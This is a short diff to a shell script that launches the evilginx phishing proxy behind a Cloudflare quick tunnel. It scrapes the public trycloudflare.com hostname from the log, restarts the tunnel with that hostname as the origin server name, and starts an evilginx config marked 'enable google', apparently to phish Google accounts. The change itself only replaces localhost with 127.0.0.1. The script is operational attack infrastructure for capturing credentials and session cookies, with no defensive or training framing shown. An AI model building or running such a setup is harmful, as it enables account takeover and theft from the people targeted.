@@ -9,7 +9,7 @@ if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi
 pkill -f evilginx 2>/dev/null || true
 
 echo "--- starting tunnel first ---"
-nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify > cloudflared.log 2>&1 &
+nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify > cloudflared.log 2>&1 &
 URL=""
 for i in $(seq 1 60); do
   URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
@@ -22,7 +22,7 @@ HOST="${URL#https://}"
 echo "--- restarting tunnel with origin SNI=$HOST ---"
 pkill -f cloudflared 2>/dev/null || true
 sleep 2
-nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify --origin-server-name "$HOST" > cloudflared.log 2>&1 &
+nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify --origin-server-name "$HOST" > cloudflared.log 2>&1 &
 sleep 3
 
 echo "--- writing evilginx config (enable google) ---"
